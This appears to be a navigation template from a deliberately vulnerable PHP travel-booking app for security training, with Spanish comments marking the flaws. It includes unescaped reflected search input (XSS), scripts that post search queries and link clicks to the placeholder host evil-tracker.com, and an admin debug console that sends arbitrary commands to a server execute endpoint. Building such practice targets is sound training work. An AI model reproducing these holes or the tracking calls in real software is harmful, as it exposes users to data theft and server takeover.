<!-- ⚠️ NAVEGACIÓN CON VULNERABILIDADES -->
<nav class="main-nav">
    <ul>
        <li><a href="?page=home">🏠 Home</a></li>
        <li><a href="?page=search">🔍 Search</a></li>
        <li><a href="?page=reviews">⭐ Reviews</a></li>
        
        <?php if (isset($_SESSION['user_id'])): ?>
            <li class="dropdown">
                <a href="#" class="dropbtn">👤 <?php echo htmlspecialchars($_SESSION['username'] ?? 'User'); ?></a>
                <div class="dropdown-content">
                    <a href="?page=profile&id=<?php echo $_SESSION['user_id']; ?>">My Profile</a>
                    <a href="?page=booking-history">My Bookings</a>
                    
                    <?php if (isset($_SESSION['is_admin']) && $_SESSION['is_admin']): ?>
                        <hr>
                        <a href="?page=admin">⚙️ Admin Panel</a>
                        <a href="?page=config-view">🔧 Config</a>
                        <a href="?page=user-management">👥 Users</a>
                    <?php endif; ?>
                    
                    <hr>
                    <a href="?page=logout">🚪 Logout</a>
                </div>
            </li>
        <?php else: ?>
            <li><a href="?page=login">🔑 Login</a></li>
            <li><a href="?page=register">📝 Register</a></li>
        <?php endif; ?>
    </ul>
    
    <!-- ⚠️ Búsqueda rápida con XSS -->
    <div class="quick-search">
        <form action="?page=search" method="GET" onsubmit="return quickSearch(this);">
            <input type="text" name="destination" placeholder="Quick search..."
                   value="<?php echo $_GET['q'] ?? ''; ?>">
            <button type="submit">Go</button>
        </form>
    </div>
</nav>

<style>
    .main-nav {
        background: #343a40;
        padding: 10px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    
    .main-nav ul {
        list-style: none;
        display: flex;
        gap: 20px;
        margin: 0;
        padding: 0;
    }
    
    .main-nav a {
        color: white;
        text-decoration: none;
        padding: 8px 12px;
        border-radius: 4px;
    }
    
    .main-nav a:hover {
        background: #495057;
    }
    
    .dropdown {
        position: relative;
    }
    
    .dropdown-content {
        display: none;
        position: absolute;
        background: white;
        min-width: 200px;
        box-shadow: 0 8px 16px rgba(0,0,0,0.2);
        z-index: 1000;
    }
    
    .dropdown-content a {
        color: black !important;
        padding: 12px 16px;
        display: block;
    }
    
    .dropdown:hover .dropdown-content {
        display: block;
    }
    
    .quick-search input {
        padding: 6px 10px;
        border: none;
        border-radius: 4px;
    }
</style>

<script>
    // ⚠️ Búsqueda rápida con validación débil
    function quickSearch(form) {
        const query = form.destination.value;
        
        // Validación muy débil
        if (query.length > 100) {
            alert('Query too long');
            return false;
        }
        
        // ⚠️ Envía datos de búsqueda a un tracker
        fetch('https://evil-tracker.com/search', {
            method: 'POST',
            body: JSON.stringify({
                query: query,
                page: window.location.href,
                timestamp: new Date().toISOString()
            })
        });
        
        return true;
    }
    
    // ⚠️ Captura clics en enlaces
    document.querySelectorAll('.main-nav a').forEach(link => {
        link.addEventListener('click', function(e) {
            const linkData = {
                href: this.href,
                text: this.textContent,
                page: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            fetch('https://evil-tracker.com/nav-click', {
                method: 'POST',
                body: JSON.stringify(linkData)
            });
        });
    });
    
    // ⚠️ Detecta si el usuario es admin (para mostrar opciones adicionales)
    <?php if (isset($_SESSION['is_admin']) && $_SESSION['is_admin']): ?>
        console.log('Admin user detected, showing admin features');
        
        // Añade opciones admin dinámicamente
        document.addEventListener('DOMContentLoaded', function() {
            const adminLinks = [
                { text: '🚨 Debug Console', href: 'javascript:openDebugConsole()' },
                { text: '📊 Analytics', href: '?page=analytics' },
                { text: '🔐 Session Viewer', href: 'javascript:viewSessions()' }
            ];
            
            const dropdown = document.querySelector('.dropdown-content');
            if (dropdown) {
                const hr = document.createElement('hr');
                dropdown.insertBefore(hr, dropdown.firstChild);
                
                adminLinks.reverse().forEach(link => {
                    const a = document.createElement('a');
                    a.href = link.href;
                    a.textContent = link.text;
                    dropdown.insertBefore(a, dropdown.firstChild);
                });
            }
        });
        
        function openDebugConsole() {
            const consoleDiv = document.createElement('div');
            consoleDiv.style.cssText = `
                position: fixed;
                top: 50px;
                right: 50px;
                width: 400px;
                height: 300px;
                background: black;
                color: lime;
                font-family: monospace;
                padding: 10px;
                z-index: 9999;
                border: 2px solid lime;
            `;
            
            consoleDiv.innerHTML = `
                <h4 style="margin-top:0;">Debug Console</h4>
                <input type="text" id="debug-cmd" placeholder="Enter command" 
                       style="width:100%; background:#333; color:lime; border:1px solid lime; padding:5px;">
                <div id="debug-output" style="height:200px; overflow:auto; margin-top:10px;"></div>
            `;
            
            document.body.appendChild(consoleDiv);
            
            document.getElementById('debug-cmd').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    const cmd = this.value;
                    this.value = '';
                    
                    fetch('../api/index.php?action=execute', {
                        method: 'POST',
                        body: JSON.stringify({ cmd: cmd })
                    })
                    .then(r => r.json())
                    .then(data => {
                        const output = document.getElementById('debug-output');
                        output.innerHTML += `$ ${cmd}\n${data.output}\n`;
                        output.scrollTop = output.scrollHeight;
                    });
                }
            });
        }
        
        function viewSessions() {
            fetch('../api/sessions.php')
                .then(r => r.json())
                .then(sessions => {
                    alert('Active sessions:\n\n' + JSON.stringify(sessions, null, 2));
                });
        }
    <?php endif; ?>
</script>